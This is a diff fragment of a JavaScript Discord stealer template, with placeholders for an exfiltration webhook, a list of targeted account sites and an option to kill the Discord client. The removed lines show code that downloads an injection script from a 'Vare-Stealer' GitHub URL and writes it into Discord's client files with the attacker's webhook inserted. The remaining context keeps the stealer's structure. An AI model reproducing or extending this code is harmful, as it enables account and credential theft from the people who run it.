@@ -17,7 +17,6 @@ let killdcop = true; // if u want to close discord make this "true" if u dont wa
 
 
 const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
-const %INJURLL% = "https://raw.githubusercontent.com/saintdaddy/Vare-Stealer/main/injection/index.js"
 const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
 
 
@@ -1370,19 +1369,7 @@ async function %FINDINJ%(firstpath) {
 }
 
 function %INJECTT%() {
-  axios.get(%INJURLL%)
-  .then(response => {
-      let data = response.data;
-      injectPath.forEach(file => {
-          fs.writeFileSync(file, data.replace("%WEBHOOK%", %webhookstring%), {
-              encoding: 'utf8',
-              flag: 'w'
-          });
-      });
-  })
-  .catch(error => {
-      console.log(error);
-  });
+  
 };
 
 async function %KILLDC%() {
@@ -1424,7 +1411,6 @@ async function %DISCORDINJ%() {
   for (const paths of discords) {
       await %FINDINJ%(paths)
   }
-  await %INJECTT%();
   await %BETTERBROKE%();
   if (killdcop)
   await %KILLDC%();
